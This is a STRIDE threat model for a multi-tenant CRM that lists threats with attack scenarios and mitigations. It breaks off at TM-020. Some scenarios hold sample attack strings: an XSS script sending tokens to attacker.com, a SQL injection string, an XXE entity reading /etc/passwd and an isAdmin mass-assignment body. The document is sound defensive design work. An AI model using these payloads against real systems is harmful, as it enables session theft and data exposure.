# STRIDE Threat Analysis

## Introduction

This document provides a comprehensive threat analysis using the **STRIDE** methodology:
- **S**poofing - Impersonating something or someone else
- **T**ampering - Modifying data or code
- **R**epudiation - Claiming to not have performed an action
- **I**nformation Disclosure - Exposing information to unauthorized parties
- **D**enial of Service - Denying or degrading service availability
- **E**levation of Privilege - Gaining unauthorized capabilities

This analysis identifies **35 distinct threats** across the multi-tenant CRM application. Each threat includes attack scenarios, impacts, mitigations, and ownership.

**Reference**: See [../tables/threats.md](../tables/threats.md) for tabular format and [../tables/threats.csv](../tables/threats.csv) for machine-readable data.

---

## Threat Summary by STRIDE Category

| STRIDE Category | Count | High Severity | Medium Severity | Low Severity |
|----------------|-------|---------------|-----------------|--------------|
| Spoofing | 6 | 3 | 2 | 1 |
| Tampering | 6 | 3 | 3 | 0 |
| Repudiation | 4 | 1 | 2 | 1 |
| Information Disclosure | 10 | 4 | 5 | 1 |
| Denial of Service | 5 | 1 | 3 | 1 |
| Elevation of Privilege | 4 | 3 | 1 | 0 |
| **Total** | **35** | **15** | **16** | **4** |

---

## SPOOFING THREATS

### TM-001: JWT Token Theft via XSS

**STRIDE Category**: Spoofing
**Affected Component**: Web Client (SPA), CRM API
**Asset**: User session tokens (JWTs)
**OWASP Mapping**: A03:2021 - Injection (XSS)

**Attack Scenario**:
1. Attacker discovers XSS vulnerability in web client (e.g., unsanitized user input in contact name field)
2. Attacker injects malicious JavaScript: `<script>fetch('https://attacker.com?token=' + localStorage.getItem('access_token'))</script>`
3. Victim user views the compromised record
4. JavaScript executes in victim's browser context
5. Access token and refresh token exfiltrated to attacker's server
6. Attacker uses stolen tokens to impersonate victim

**Preconditions**:
- XSS vulnerability exists in client-side rendering
- Tokens stored in localStorage (XSS-accessible)
- Victim user views attacker-controlled content

**Impact**:
- **Confidentiality**: High - Attacker gains full access to victim's tenant data
- **Integrity**: High - Attacker can modify data as victim
- **Availability**: Low - No direct availability impact

**Likelihood**: Medium (XSS is common, localStorage token storage is risky)
**Severity**: **HIGH**

**Detection/Telemetry**:
- Content Security Policy (CSP) violation reports
- Anomaly detection: API calls from unusual IP/location for user
- Multiple sessions from different geolocations

**Mitigations**:

**Preventive**:
- Implement strict Content Security Policy (CSP): `default-src 'self'; script-src 'self'; object-src 'none'`
- Store tokens in httpOnly, secure, SameSite cookies (not localStorage)
- Output encoding for all user-generated content (React auto-escapes by default, but validate)
- Input validation and sanitization on server-side
- Use Trusted Types API to prevent DOM-based XSS

**Detective**:
- CSP reporting endpoint to alert on violations
- WAF logging XSS attempt patterns
- Anomaly detection on user login patterns

**Responsive**:
- Token revocation capability (immediately revoke refresh tokens)
- Force password reset for affected users
- Incident response playbook for token theft

**Residual Risk**: Low (with mitigations in place)
**Owner**: Application Team
**Priority**: P0

---

### TM-002: Credential Stuffing Attack on Login

**STRIDE Category**: Spoofing
**Affected Component**: Identity Provider (IdP), Web Client
**Asset**: User credentials
**OWASP Mapping**: A07:2021 - Identification and Authentication Failures

**Attack Scenario**:
1. Attacker obtains list of email/password combinations from third-party breaches (e.g., haveibeenpwned)
2. Attacker uses botnet to attempt logins with stolen credentials
3. Users who reused passwords from breached sites are successfully authenticated
4. Attacker gains access to CRM accounts

**Preconditions**:
- Users reuse passwords across multiple sites
- No rate limiting on login attempts
- No anomaly detection on failed logins

**Impact**:
- **Confidentiality**: High - Unauthorized access to tenant data
- **Integrity**: Medium - Attacker can modify data
- **Availability**: Low - No direct availability impact

**Likelihood**: High (password reuse is common)
**Severity**: **HIGH**

**Detection/Telemetry**:
- Failed login attempt counts (per IP, per email)
- Login success from new device/location alerts
- Monitoring for rapid-fire login attempts

**Mitigations**:

**Preventive**:
- **Multi-Factor Authentication (MFA)** mandatory for all users (or at least admins)
- Rate limiting on login endpoint (10 attempts per 15 minutes per IP)
- Account lockout after 5 failed attempts (with CAPTCHA or cooldown)
- Password complexity requirements
- Check passwords against breach databases (e.g., Have I Been Pwned API)
- Bot detection (CAPTCHA, device fingerprinting)

**Detective**:
- IdP logs for failed authentication attempts
- Anomaly detection: new device/location login triggers MFA or email notification
- SIEM alerts on brute force patterns

**Responsive**:
- Force password reset for compromised accounts
- Notify users of suspicious login attempts
- Block IP ranges exhibiting attack patterns

**Residual Risk**: Low-Medium (MFA significantly reduces risk)
**Owner**: Platform Team (IdP configuration)
**Priority**: P0

---

### TM-003: Phishing Attack Targeting Tenant Admins

**STRIDE Category**: Spoofing
**Affected Component**: Identity Provider, Admin Users
**Asset**: Admin credentials, tenant access
**OWASP Mapping**: A07:2021 - Identification and Authentication Failures

**Attack Scenario**:
1. Attacker sends phishing email to tenant admin impersonating CRM platform
2. Email contains fake login page (looks identical to real IdP)
3. Admin enters credentials on phishing site
4. Attacker captures credentials and MFA code (real-time phishing)
5. Attacker logs into real platform using stolen credentials

**Preconditions**:
- Admin is susceptible to phishing
- MFA is time-based (TOTP), not phishing-resistant (WebAuthn)

**Impact**:
- **Confidentiality**: High - Full tenant data access
- **Integrity**: High - Admin can modify all tenant data
- **Availability**: Medium - Admin can delete data

**Likelihood**: Medium (targeted phishing of high-value accounts)
**Severity**: **HIGH**

**Detection/Telemetry**:
- Login from new device/location triggers alert
- Rapid credential use across multiple IPs (credential harvesting)
- User reports phishing attempts

**Mitigations**:

**Preventive**:
- **Phishing-resistant MFA** for admins (WebAuthn/FIDO2, not SMS or TOTP)
- Domain reputation monitoring (alert on lookalike domains)
- Email authentication (SPF, DKIM, DMARC) to prevent sender spoofing
- User security awareness training (phishing simulations)
- Browser-based phishing detection (Google Safe Browsing, Microsoft SmartScreen)

**Detective**:
- Anomaly detection on admin logins (location, device)
- Conditional access policies (e.g., admin login from unknown location requires approval)

**Responsive**:
- Immediate password reset for compromised admin accounts
- Revoke all admin sessions
- Audit all admin actions since compromise
- Incident response plan for admin account takeover

**Residual Risk**: Low-Medium (phishing-resistant MFA greatly reduces risk)
**Owner**: Platform Team + Security Awareness Team
**Priority**: P1

---

### TM-004: Session Fixation Attack

**STRIDE Category**: Spoofing
**Affected Component**: Web Client, CRM API
**Asset**: User sessions
**OWASP Mapping**: A07:2021 - Identification and Authentication Failures

**Attack Scenario**:
1. Attacker obtains a valid session token (e.g., by creating their own account)
2. Attacker tricks victim into using this session token (e.g., via phishing link with token in URL)
3. Victim authenticates using the attacker-controlled session
4. Attacker now shares the authenticated session with victim
5. Attacker can act as the victim

**Preconditions**:
- Session tokens are predictable or can be set by attacker
- Session not regenerated after authentication

**Impact**:
- **Confidentiality**: High - Attacker accesses victim's data
- **Integrity**: High - Attacker can act as victim
- **Availability**: Low

**Likelihood**: Low (modern frameworks prevent this, but misconfigurations happen)
**Severity**: **MEDIUM**

**Detection/Telemetry**:
- Session creation from multiple IPs
- Concurrent sessions from different geolocations

**Mitigations**:

**Preventive**:
- **Regenerate session token after authentication** (IdP handles this in OIDC flow)
- Do not accept session tokens from URL parameters (tokens only in Authorization header or httpOnly cookies)
- Use cryptographically random session IDs
- Implement SameSite cookie attribute

**Detective**:
- Log session creation and authentication events
- Alert on concurrent sessions from different locations

**Responsive**:
- Terminate all sessions for affected user
- Force re-authentication

**Residual Risk**: Very Low (using OIDC with proper IdP configuration)
**Owner**: Application Team
**Priority**: P2

---

### TM-005: Refresh Token Replay Attack

**STRIDE Category**: Spoofing
**Affected Component**: Identity Provider, Web Client
**Asset**: Refresh tokens
**OWASP Mapping**: A07:2021 - Identification and Authentication Failures

**Attack Scenario**:
1. Attacker steals refresh token (e.g., from localStorage via XSS or physical access to device)
2. Attacker uses refresh token to obtain new access tokens indefinitely
3. Even after victim logs out, attacker can continue accessing account

**Preconditions**:
- Refresh token is long-lived (30 days)
- Refresh tokens are not rotated on use
- No refresh token revocation on logout

**Impact**:
- **Confidentiality**: High - Persistent access to account
- **Integrity**: High - Can modify data
- **Availability**: Low

**Likelihood**: Medium (refresh token theft is plausible)
**Severity**: **HIGH**

**Detection/Telemetry**:
- Multiple refresh token uses from different IPs
- Refresh token use after user logout event

**Mitigations**:

**Preventive**:
- **Refresh token rotation**: Issue new refresh token on every use, invalidate old one (OAuth 2.1 recommendation)
- Store refresh tokens in httpOnly, secure cookies (not localStorage)
- Shorter refresh token lifetime (7 days instead of 30)
- Bind refresh tokens to device/browser fingerprint

**Detective**:
- Monitor for refresh token reuse (should never happen with rotation)
- Alert on refresh token use from new location/device

**Responsive**:
- Revoke all refresh tokens on logout
- Revoke all user sessions if suspicious activity detected
- Force password reset

**Residual Risk**: Low (with token rotation)
**Owner**: Platform Team (IdP configuration)
**Priority**: P1

---

### TM-006: Email Spoofing for Phishing or Social Engineering

**STRIDE Category**: Spoofing
**Affected Component**: Email Provider (SendGrid), End Users
**Asset**: User trust, credentials
**OWASP Mapping**: N/A (not application vulnerability, but system threat)

**Attack Scenario**:
1. Attacker sends email appearing to come from `noreply@crm-platform.com` (spoofed sender)
2. Email asks user to "verify account" by clicking link to fake login page
3. User believes email is legitimate and enters credentials

**Preconditions**:
- SPF, DKIM, DMARC not configured or not enforced
- Users do not verify email authenticity

**Impact**:
- **Confidentiality**: Medium - Credential theft
- **Integrity**: Low - No direct integrity impact on platform
- **Availability**: Low

**Likelihood**: Medium (email spoofing is common)
**Severity**: **MEDIUM**

**Detection/Telemetry**:
- User reports of suspicious emails
- DMARC reports showing failed authentication

**Mitigations**:

**Preventive**:
- **SPF record** published in DNS (specify authorized mail servers)
- **DKIM signing** for all outbound emails (cryptographic signature)
- **DMARC policy** set to `p=reject` (reject emails failing SPF/DKIM)
- Brand monitoring for lookalike domains
- User education on verifying email authenticity

**Detective**:
- DMARC aggregate reports
- Monitor for lookalike domain registrations
- User reporting mechanism for suspicious emails

**Responsive**:
- Takedown requests for phishing sites
- Communicate with users about phishing attempts
- Update DMARC policy to reject failures

**Residual Risk**: Medium (cannot prevent all phishing, relies on user vigilance)
**Owner**: Platform Team + Security Team
**Priority**: P1

---

## TAMPERING THREATS

### TM-007: SQL Injection via Unsanitized Input

**STRIDE Category**: Tampering
**Affected Component**: CRM API, PostgreSQL Database
**Asset**: Database integrity, tenant data
**OWASP Mapping**: A03:2021 - Injection

**Attack Scenario**:
1. Attacker finds search endpoint: `GET /api/contacts/search?q=<query>`
2. Endpoint constructs SQL with string concatenation: `SELECT * FROM contacts WHERE name LIKE '%${query}%' AND tenant_id = '${tenantId}'`
3. Attacker submits: `q=' OR '1'='1' --`
4. Resulting query: `SELECT * FROM contacts WHERE name LIKE '%' OR '1'='1' --%' AND tenant_id = '...'`
5. Query returns all contacts across all tenants (tenant filter bypassed)

**Preconditions**:
- SQL query uses string concatenation instead of parameterized statements
- Input validation missing or insufficient

**Impact**:
- **Confidentiality**: High - Access to all tenant data
- **Integrity**: High - Can modify/delete data with UPDATE/DELETE injection
- **Availability**: Medium - Can DROP tables

**Likelihood**: Low (modern ORMs prevent this, but raw SQL exists in legacy code)
**Severity**: **HIGH**

**Detection/Telemetry**:
- WAF detecting SQL injection patterns
- Database error logs (syntax errors from malformed injections)
- Anomaly in query execution time (complex injected queries)

**Mitigations**:

**Preventive**:
- **Use parameterized queries/prepared statements** (ORM or manual): `SELECT * FROM contacts WHERE name LIKE $1 AND tenant_id = $2`
- **Never concatenate user input into SQL** strings
- Input validation (allowlist expected characters, length limits)
- Use ORM framework (Sequelize, TypeORM, Prisma) that auto-escapes
- Least-privilege database user (no DROP, ALTER permissions)

**Detective**:
- SAST tools in CI/CD to detect SQL string concatenation
- WAF logging SQL injection attempts
- Database query logging (expensive queries, errors)

**Responsive**:
- Block attacker IP
- Review and fix vulnerable endpoint immediately
- Audit database for unauthorized changes
- Restore from backup if data tampered

**Residual Risk**: Very Low (with parameterized queries)
**Owner**: Application Team
**Priority**: P0

---

### TM-008: Mass Assignment / Over-Posting Attack

**STRIDE Category**: Tampering
**Affected Component**: CRM API
**Asset**: Database integrity, user privileges
**OWASP Mapping**: A04:2021 - Insecure Design

**Attack Scenario**:
1. API endpoint for updating user profile: `PUT /api/users/profile`
2. Expected fields: `{ "email": "...", "name": "..." }`
3. Attacker adds: `{ "email": "...", "name": "...", "isAdmin": true, "tenantId": "other-tenant" }`
4. If backend blindly updates all fields from request, attacker grants themselves admin privileges or changes tenant

**Preconditions**:
- API accepts all JSON fields without validation
- No field allowlist/denylist

**Impact**:
- **Confidentiality**: High - Privilege escalation
- **Integrity**: High - Unauthorized field modification
- **Availability**: Low

**Likelihood**: Medium (common developer mistake)
**Severity**: **HIGH**

**Detection/Telemetry**:
- Audit logs showing privilege changes
- Unexpected field values in requests

**Mitigations**:

**Preventive**:
- **Explicit field allowlisting**: Only accept expected fields (`const allowedFields = ['email', 'name'];`)
- Use DTO (Data Transfer Object) pattern with validation
- Mark sensitive fields as read-only in ORM models (`isAdmin: { type: Boolean, allowUpdate: false }`)
- Schema validation (JSON Schema, OpenAPI) rejecting unexpected fields

**Detective**:
- Audit log review for unexpected field changes
- Alert on privilege field changes (`isAdmin`, `roles`, `tenantId`)

**Responsive**:
- Revert unauthorized changes
- Investigate how attacker discovered vulnerability
- Fix vulnerable endpoints

**Residual Risk**: Low (with field allowlisting)
**Owner**: Application Team
**Priority**: P0

---

### TM-009: File Upload Tampering (Malicious File Injection)

**STRIDE Category**: Tampering
**Affected Component**: CRM API, Object Storage, Worker Service
**Asset**: System integrity, user devices
**OWASP Mapping**: A04:2021 - Insecure Design, A08:2021 - Software and Data Integrity Failures

**Attack Scenario**:
1. Attacker uploads malicious file disguised as PDF: `malware.exe.pdf` or polyglot file (valid PDF + embedded malware)
2. File stored in S3 without virus scanning
3. Victim user downloads file
4. If file auto-opens or user executes it, malware infects victim's device

**Alternate Scenario (Server-Side)**:
1. Attacker uploads SVG file with embedded XXE (XML External Entity) attack
2. Worker service processes SVG (e.g., thumbnail generation)
3. XXE payload reads server files: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`

**Preconditions**:
- No virus scanning on uploads
- File type validation by extension only (not magic bytes)
- Worker processes untrusted files without sandboxing

**Impact**:
- **Confidentiality**: Medium - Malware may exfiltrate data
- **Integrity**: High - Malware infection
- **Availability**: Medium - Ransomware could encrypt files

**Likelihood**: Medium (attackers target file uploads)
**Severity**: **HIGH**

**Detection/Telemetry**:
- Virus scan failures
- Unusual file types uploaded
- Worker errors processing files

**Mitigations**:

**Preventive**:
- **Virus scanning** on all uploads (ClamAV, cloud-based scanner)
- **File type validation** using magic bytes (not just extension): `libmagic`
- **Content Security Policy** for downloads: `Content-Disposition: attachment` (force download, not inline)
- **Allowlist file types**: Only PDF, PNG, JPG, DOCX (reject executables, scripts)
- **Sandbox worker file processing** (run in isolated container)
- **Disable server-side file parsing** for untrusted formats (SVG, XML)

**Detective**:
- Virus scan logs
- Monitor for unusual file extensions or sizes

**Responsive**:
- Quarantine malicious files
- Notify users who downloaded malicious files
- Investigate how file bypassed validation

**Residual Risk**: Low-Medium (virus scanning not 100% effective against zero-days)
**Owner**: Application Team + Security Team
**Priority**: P1

---

### TM-010: Queue Message Tampering

**STRIDE Category**: Tampering
**Affected Component**: Message Queue (SQS), Worker Service
**Asset**: Background job integrity
**OWASP Mapping**: A08:2021 - Software and Data Integrity Failures

**Attack Scenario**:
1. Attacker gains access to message queue (via stolen AWS credentials or misconfigured IAM)
2. Attacker modifies messages in queue: changes `tenant_id`, `email` recipient, or `job_type`
3. Worker processes tampered message, sending email to wrong recipient or executing wrong job

**Preconditions**:
- Message queue not encrypted or authenticated
- Worker does not validate message integrity
- IAM permissions too broad

**Impact**:
- **Confidentiality**: Medium - Data sent to wrong recipient
- **Integrity**: High - Wrong actions executed
- **Availability**: Low

**Likelihood**: Low (requires compromised credentials)
**Severity**: **MEDIUM**

**Detection/Telemetry**:
- Unexpected job executions
- User complaints about wrong notifications
- IAM audit logs showing unauthorized queue access

**Mitigations**:

**Preventive**:
- **Encrypt queue messages** at rest (SQS server-side encryption)
- **Encrypt messages in transit** (TLS for queue access)
- **Message signing** (HMAC or digital signature): Worker validates signature before processing
- **Least-privilege IAM**: Only application service can write to queue, only worker can read
- **Immutable queue messages**: Use dead-letter queue instead of modifying failed messages

**Detective**:
- Monitor IAM access to queue
- Validate message schema in worker (reject malformed messages)

**Responsive**:
- Rotate queue access credentials
- Investigate source of tampering
- Reprocess jobs from backup queue

**Residual Risk**: Low (with encryption and IAM controls)
**Owner**: Application Team + Platform Team
**Priority**: P2

---

### TM-011: HTML Injection in Generated Reports

**STRIDE Category**: Tampering
**Affected Component**: Worker Service (PDF generation), Object Storage
**Asset**: Generated reports (PDFs), user trust
**OWASP Mapping**: A03:2021 - Injection

**Attack Scenario**:
1. Attacker creates contact with name: `<script>alert('XSS')</script>` or `<h1>HACKED</h1>`
2. User generates PDF report including contact list
3. Worker renders contact name into HTML template without escaping
4. If PDF viewer interprets HTML/JavaScript, XSS executes (some PDF viewers support JavaScript)
5. OR: Report visually defaced, misleading information

**Preconditions**:
- Report generation does not escape user input
- PDF viewer supports JavaScript or HTML rendering

**Impact**:
- **Confidentiality**: Low - Limited XSS scope (in PDF viewer)
- **Integrity**: Medium - Report content manipulated
- **Availability**: Low

**Likelihood**: Medium (developers often forget to escape in report generation)
**Severity**: **MEDIUM**

**Detection/Telemetry**:
- User complaints about report content
- Unusual characters in generated reports

**Mitigations**:

**Preventive**:
- **Output encoding** in report templates (escape HTML entities)
- Use safe PDF generation library (wkhtmltopdf, Puppeteer with CSP)
- **Input validation**: Reject or sanitize HTML tags in user input
- Generate plain-text reports or use safe format (CSV)

**Detective**:
- Scan generated reports for suspicious patterns
- User feedback on report quality

**Responsive**:
- Regenerate affected reports
- Fix template escaping

**Residual Risk**: Low (with proper output encoding)
**Owner**: Application Team
**Priority**: P2

---

### TM-012: Data Tampering via Broken Access Control

**STRIDE Category**: Tampering
**Affected Component**: CRM API
**Asset**: CRM records (contacts, deals)
**OWASP Mapping**: A01:2021 - Broken Access Control

**Attack Scenario**:
1. Attacker is sales rep in Tenant A, can only modify their own contacts
2. Attacker discovers endpoint: `PUT /api/contacts/{id}` does not check ownership
3. Attacker modifies contact belonging to another sales rep: `PUT /api/contacts/9999` (not their contact)
4. Or attacker modifies contact in Tenant B: `PUT /api/contacts/8888` (different tenant)

**Preconditions**:
- Authorization check only verifies authentication (valid token) but not ownership
- No tenant ID validation on resource access

**Impact**:
- **Confidentiality**: Medium - Can read other users' data
- **Integrity**: High - Can modify other users' or tenants' data
- **Availability**: Medium - Can delete data

**Likelihood**: High (BOLA/IDOR is OWASP API #1 threat)
**Severity**: **HIGH**

**Detection/Telemetry**:
- Audit logs showing user modifying resources they don't own
- Anomaly detection: User accessing unusually high number of resources

**Mitigations**:

**Preventive**:
- **Resource-level authorization checks**: Before modifying resource, verify `resource.tenant_id == current_user.tenant_id AND (resource.owner_id == current_user.id OR user.hasPermission('modify_all_contacts'))`
- **Automated authorization testing**: Test that User A cannot access User B's resources
- Use authorization framework (Casbin, Oso) to centralize policy

**Detective**:
- Audit log review
- Anomaly detection on access patterns

**Responsive**:
- Revert unauthorized changes
- Investigate extent of access
- Fix vulnerable endpoints

**Residual Risk**: Low (with proper authorization checks)
**Owner**: Application Team
**Priority**: P0

---

## REPUDIATION THREATS

### TM-013: Missing Audit Logs for Admin Actions

**STRIDE Category**: Repudiation
**Affected Component**: Admin Portal, CRM API
**Asset**: Audit trail, compliance
**OWASP Mapping**: A09:2021 - Security Logging and Monitoring Failures

**Attack Scenario**:
1. Malicious admin exfiltrates sensitive tenant data via admin portal
2. OR: Admin accidentally deletes customer records
3. No audit log exists of admin actions (who accessed what, when)
4. Admin denies performing the action
5. Investigation is impossible due to lack of evidence

**Preconditions**:
- Audit logging not implemented for admin actions
- Logs do not capture sufficient detail (user ID, action, timestamp, target tenant/resource)

**Impact**:
- **Confidentiality**: Indirect - Enables undetected breaches
- **Integrity**: Indirect - Enables undetected tampering
- **Availability**: Low
- **Compliance**: High - SOC 2, GDPR, HIPAA require audit trails

**Likelihood**: High (audit logging often incomplete)
**Severity**: **MEDIUM** (enabler for other attacks)

**Detection/Telemetry**:
- Gap: Cannot detect without logs!

**Mitigations**:

**Preventive**:
- **Comprehensive audit logging** for ALL admin actions:
  - User impersonation (start, end, target user)
  - Data exports (what data, which tenant)
  - Configuration changes (feature flags, settings)
  - User/role modifications
- Log format: `{"timestamp": "...", "admin_user_id": "...", "action": "impersonate", "target_tenant_id": "...", "target_user_id": "...", "reason": "Support ticket #123", "ip": "...", "session_id": "..."}`
- **Immutable logs**: Send to SIEM/S3 with write-once policy (prevent log tampering)
- **Log integrity**: Hash chain or digital signature to prevent modification

**Detective**:
- Regular audit log review
- SIEM alerts on high-privilege actions

**Responsive**:
- Investigate logged actions during incident response
- Use logs for compliance audits

**Residual Risk**: Very Low (with comprehensive logging)
**Owner**: Application Team + Security Team
**Priority**: P0

---

### TM-014: Non-Repudiation Failure for Financial Transactions

**STRIDE Category**: Repudiation
**Affected Component**: Payment Provider Integration, CRM API
**Asset**: Payment records, billing integrity
**OWASP Mapping**: A09:2021 - Security Logging and Monitoring Failures

**Attack Scenario**:
1. Tenant claims they did not authorize subscription upgrade (charge disputed)
2. No audit log or receipt proving tenant admin performed the action
3. Platform cannot prove transaction legitimacy
4. Chargeback issued, platform loses revenue

**Preconditions**:
- No audit trail for billing/payment actions
- No confirmation emails or receipts
- No digital signature or proof of consent

**Impact**:
- **Financial**: Medium - Chargeback fees, lost revenue
- **Legal**: Low-Medium - Dispute resolution difficulty
- **Integrity**: Low

**Likelihood**: Low-Medium (disputes are common)
**Severity**: **MEDIUM**

**Detection/Telemetry**:
- Chargeback notifications from payment processor

**Mitigations**:

**Preventive**:
- **Audit log all billing actions**: Upgrade, downgrade, payment method changes
- **Email confirmations** for all billing changes (timestamped, digitally signed)
- **Require re-authentication** for billing changes (MFA)
- **Webhook signature validation** from Stripe (prove events came from Stripe)
- Store payment processor transaction IDs (link to external proof)

**Detective**:
- Monitor chargeback rates
- Review audit logs during dispute investigation

**Responsive**:
- Provide audit logs and receipts during dispute
- Implement stronger confirmation for high-value transactions

**Residual Risk**: Low (with audit logs and confirmations)
**Owner**: Application Team + Finance Team
**Priority**: P1

---

### TM-015: Log Tampering or Deletion by Attacker

**STRIDE Category**: Repudiation (attacker covering tracks)
**Affected Component**: Logging System, CRM API
**Asset**: Audit logs, forensic evidence
**OWASP Mapping**: A09:2021 - Security Logging and Monitoring Failures

**Attack Scenario**:
1. Attacker gains access to system (e.g., via compromised credentials)
2. Attacker performs malicious actions (data exfiltration)
3. Attacker deletes or modifies logs to hide evidence
4. Investigation finds no evidence of breach

**Preconditions**:
- Logs stored on same system as application (can be accessed by attacker)
- Log files have write/delete permissions for application user

**Impact**:
- **Confidentiality**: Indirect (breach undetected)
- **Integrity**: High (evidence destroyed)
- **Availability**: Low
- **Compliance**: High (loss of audit trail)

**Likelihood**: Medium (sophisticated attackers target logs)
**Severity**: **HIGH** (prevents forensics)

**Detection/Telemetry**:
- Log file modification events (file integrity monitoring)
- Gap in log timestamps (missing entries)

**Mitigations**:

**Preventive**:
- **Write-only logging**: Application can write logs but not read/modify/delete
- **Immutable log storage**: Send logs to SIEM / S3 with object lock (write-once-read-many)
- **Log forwarding**: Real-time forwarding to external SIEM (Splunk, Datadog)
- **Separate log storage**: Logs stored in different AWS account/subscription with restricted access
- **Log integrity**: Hash chain or blockchain-style signing to detect tampering

**Detective**:
- File Integrity Monitoring (FIM) on log files
- Alert on log file modifications
- SIEM monitors for missing logs (expected log rate drops to zero)

**Responsive**:
- Investigate log deletion as high-priority security incident
- Restore logs from SIEM/backup

**Residual Risk**: Very Low (with write-only, immutable, external log storage)
**Owner**: Platform Team + Security Team
**Priority**: P1

---

### TM-016: Lack of User Action Logging (Non-Admin)

**STRIDE Category**: Repudiation
**Affected Component**: CRM API, Logging System
**Asset**: User activity audit trail
**OWASP Mapping**: A09:2021 - Security Logging and Monitoring Failures

**Attack Scenario**:
1. User (sales rep) exfiltrates entire customer database via API
2. No logs exist of data access (only login events logged)
3. User denies downloading data
4. Investigation cannot determine what data was accessed

**Preconditions**:
- Only authentication events logged (not data access)
- No logging of sensitive operations (bulk export, search, data access)

**Impact**:
- **Confidentiality**: Indirect (breach undetected)
- **Compliance**: Medium (GDPR requires data access logs)
- **Availability**: Low

**Likelihood**: Medium (logging often incomplete)
**Severity**: **LOW-MEDIUM** (privacy/compliance concern)

**Detection/Telemetry**:
- Gap: Cannot detect without logs

**Mitigations**:

**Preventive**:
- **Log sensitive data access**: Bulk exports, searches, contact views (with privacy considerations)
- **Privacy-conscious logging**: Log metadata (user, timestamp, action, row count) NOT full data content
- **Sampling**: Log all admin actions + sample of user actions (e.g., 10% of queries for performance)

**Detective**:
- Review access logs periodically
- Anomaly detection: User accessing unusually high volume of records

**Responsive**:
- Use access logs during breach investigation
- Provide access logs for GDPR/CCPA data subject access requests

**Residual Risk**: Low (with selective logging)
**Owner**: Application Team
**Priority**: P2

---

## INFORMATION DISCLOSURE THREATS

### TM-017: Broken Object Level Authorization (BOLA) - Cross-Tenant Data Access

**STRIDE Category**: Information Disclosure
**Affected Component**: CRM API
**Asset**: Tenant data (contacts, deals, all CRM records)
**OWASP Mapping**: API1:2023 - Broken Object Level Authorization (OWASP API Security Top 10)

**Attack Scenario**:
1. User in Tenant A authenticated with valid JWT
2. User enumerates resource IDs: `GET /api/contacts/1`, `/api/contacts/2`, ...
3. API does not verify `contact.tenant_id == user.tenant_id`
4. User discovers `/api/contacts/9999` belongs to Tenant B
5. API returns Tenant B's contact data
6. Repeat for all endpoints: deals, attachments, etc.

**Preconditions**:
- Authorization check only validates authentication (valid token) but not resource ownership
- Resource IDs are sequential or predictable

**Impact**:
- **Confidentiality**: CRITICAL - Complete cross-tenant data breach
- **Integrity**: High - Can modify if PUT/DELETE also lack checks
- **Availability**: Low

**Likelihood**: High (BOLA is #1 API threat)
**Severity**: **HIGH** (CRITICAL in multi-tenant systems)

**Detection/Telemetry**:
- Anomaly detection: User accessing resources with IDs outside their normal range
- Audit logs: User accessing resources from different tenant

**Mitigations**:

**Preventive**:
- **Mandatory tenant scoping**: EVERY resource access must check `resource.tenant_id == current_user.tenant_id`
- **Authorization helper function**: Centralize check: `authorizeResource(user, resource)`
- **Use UUIDs for resource IDs** (not sequential integers) to prevent enumeration
- **Automated testing**: Test that Tenant A user cannot access Tenant B resource (CI/CD gate)
- **Database RLS**: Row-level security as defense-in-depth

**Detective**:
- Audit logging of resource access with tenant ID
- Anomaly detection on access patterns

**Responsive**:
- Immediate hotfix for vulnerable endpoints
- Forensic analysis: Which resources were accessed?
- Notify affected tenants (breach disclosure)

**Residual Risk**: Very Low (with comprehensive authorization checks + automated testing)
**Owner**: Application Team
**Priority**: P0 (MOST CRITICAL THREAT)

---

### TM-018: Excessive Data Exposure in API Responses

**STRIDE Category**: Information Disclosure
**Affected Component**: CRM API
**Asset**: Sensitive user data (PII, internal IDs)
**OWASP Mapping**: API3:2023 - Excessive Data Exposure (OWASP API Security Top 10)

**Attack Scenario**:
1. API endpoint returns full user object: `GET /api/users/me`
2. Response includes sensitive fields not needed by client: `{"id": 123, "email": "...", "password_hash": "...", "internal_user_id": "...", "salary": 50000}`
3. Client-side filtering is used (rely on frontend to hide fields)
4. Attacker inspects API response and finds exposed sensitive data

**Preconditions**:
- API returns all database columns without filtering
- Over-reliance on client-side to hide fields

**Impact**:
- **Confidentiality**: Medium-High - Exposure of PII, internal data
- **Integrity**: Low
- **Availability**: Low

**Likelihood**: High (common developer mistake)
**Severity**: **MEDIUM-HIGH**

**Detection/Telemetry**:
- API response schema analysis (detect unexpected fields)
- User reports

**Mitigations**:

**Preventive**:
- **Response DTOs**: Explicitly define response schema (do not return raw DB models)
- **Field allowlisting**: Only include necessary fields in response
- **Property-level authorization**: Some fields visible only to admins (e.g., `salary` visible to HR role only)
- **OpenAPI schema validation**: Document expected response structure, validate in tests

**Detective**:
- API contract testing (ensure responses match schema)
- Penetration testing

**Responsive**:
- Fix API to remove excessive fields
- Assess if sensitive data was exposed in logs/caches

**Residual Risk**: Low (with DTOs)
**Owner**: Application Team
**Priority**: P1

---

### TM-019: Object Storage Bucket Misconfiguration (Public Exposure)

**STRIDE Category**: Information Disclosure
**Affected Component**: Object Storage (S3/Azure Blob)
**Asset**: File attachments (may contain PII, proprietary documents)
**OWASP Mapping**: A05:2021 - Security Misconfiguration

**Attack Scenario**:
1. S3 bucket ACL accidentally set to public-read (common misconfiguration)
2. Attacker discovers bucket URL (e.g., via Google dorking: `site:s3.amazonaws.com crm`)
3. Attacker lists bucket contents and downloads all files
4. All tenant attachments (contracts, proposals, financial docs) exposed

**Preconditions**:
- S3 bucket policy allows public access
- Bucket not using signed URLs

**Impact**:
- **Confidentiality**: CRITICAL - All uploaded files exposed
- **Integrity**: Low (if bucket also allows public write)
- **Availability**: Low

**Likelihood**: Medium (S3 misconfigurations are common)
**Severity**: **HIGH**

**Detection/Telemetry**:
- AWS Config / Azure Policy detecting public buckets
- Bucket access logs showing anonymous requests
- S3 Public Access Block status

**Mitigations**:

**Preventive**:
- **Block Public Access** at account level (AWS S3 Block Public Access feature)
- **Bucket policy**: Deny public access explicitly
- **Use signed URLs only**: All file access via time-limited pre-signed URLs
- **IAM policies**: Only application service role can access bucket
- **Infrastructure-as-Code (IaC) scanning**: Checkov, tfsec to detect public buckets in Terraform

**Detective**:
- AWS Config rule: `s3-bucket-public-read-prohibited`
- Daily bucket policy audits
- Monitor for anonymous access in CloudTrail/S3 access logs

**Responsive**:
- Immediately revoke public access
- Investigate what was accessed (review S3 access logs)
- Notify affected tenants
- Rotate bucket credentials

**Residual Risk**: Very Low (with Block Public Access enabled)
**Owner**: Platform Team
**Priority**: P0

---

### TM-020: Sensitive Data in Application Logs

**STRIDE Category**: Information Disclosure
